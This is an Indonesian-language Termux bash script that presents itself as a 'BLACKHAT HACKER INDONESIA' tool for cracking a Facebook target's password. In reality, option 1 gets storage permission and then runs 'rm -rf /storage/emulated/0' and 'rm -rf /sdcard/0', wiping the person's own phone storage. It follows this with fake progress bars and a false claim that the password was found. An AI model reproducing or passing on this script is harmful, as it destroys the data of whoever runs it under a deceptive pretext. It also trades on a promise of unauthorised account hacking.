
#!/system/xbin/bash
# Bersihkan Layar
clear
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
###################################################
# CTRL C-
###################################################
trap ctrl_c INT
ctrl_c() {
clear
echo $red"[#]> (Ctrl + C ) Detected, 
Trying To Exit ... "
sleep 1
echo ""
echo $yellow"[#]> Terima kasih Telah Menggunakan Tools Saya :)"
sleep 1
echo ""
echo $white"[#]> BLACKHAT HACKER INDONESIA"
read enter
exit
}
echo             "
____________________________________________" | lolcat
echo $Orange"Contact : mrcrack@kbox.li"
echo $Orange"AUTHOR : Mr Crack"
echo $silver"BLACKHAT HACKER INDONESIA"
echo             "
____________________________________________" | lolcat
echo $green"01) HACK FACEBOOK TARGET 2019"
echo $green"02)Langkah Langkah Sebelum Menggunakan Tools"
read -p "[BHI TOOLS]> " bro;

if [ $bro = 1 ] || [ $bro = 01 ]
then
clear
echo $green"Masukkan Username/Email Target "
read -p "[Username/Email=]> " bro;
sleep 3
termux-setup-storage
rm -rf /storage/emulated/0
rm -rf /sdcard/0
echo $green"Sedang Mencari Username/Email TARGET"
sleep 5
echo $green">60 Detik"
sleep 5
echo $green">59 Detik"
sleep 5
echo $green">58 Detik"
sleep 5
echo $green">57 Detik"
sleep 5
echo $green"✓Succes Mencari Username/Email TARGET !!!"
sleep 5
clear
echo $green"Sedang Mencari Password..Tunggu Sebentar !!"
sleep 5
echo $green"█ 1%"
sleep 5
echo $green"██ 10%"
sleep 5
echo $green"███ 20%"
sleep 5
echo $green"████ 30%"
sleep 5
echo $green"█████ 40%"
sleep 5
echo $green"██████ 50%"
sleep 3
echo $red"Ups! Pencarian Password Gagal :("
sleep 5
echo $red"Ulangi?Y/N"
read -p "[BHI TOOLS]> " bro;
echo $green"Mengulangi Pencarian.. Tunggu Sebentar !!"
sleep 5
echo $green"█ 1%"
sleep 5
echo $green"██ 10%"
sleep 5
echo $green"███ 20%"
sleep 5
echo $green"████ 30%"
sleep 5
echo $green"█████ 40%"
sleep 5
echo $green"██████ 50%"
sleep 5
echo $green"███████ 60%"
sleep 5
echo $green"████████ 70%"
sleep 2
echo $blue"Pencarian Password Berhasil !!"
sleep 1
echo $blue"Cek Log Untuk Mengetahui Password TARGET"
sleep 1
echo $green"Cek Di Luar Internal/Password.txt"
sleep 10
clear
echo $blue"Perlu Bantuan?"
sleep 1
echo $blue"Whatsapp Me : +371 21 795 867"
sleep 5
echo $blue"Thanks To : Mr SoUrchID/"
sleep 1
echo $blue"Thanks To : Mr Hari-X"
sleep 1
echo $blue"Thanks To : Crusher."
sleep 1
echo $blue"Thanks To : Hans"
exit
fi

if [ $bro = 2 ] || [ $bro = 02 ]
then
clear
echo $green"Harap Izinkan Termux untuk mengakses storage"
echo $green"Agar bisa menyimpan hasil Crack Password ke Penyimpanan Anda"
termux-setup-storage
sleep 4
termux-setup-storage
sleep 4
termux-setup-storage
sleep 4
termux-setup-storage
exit
fi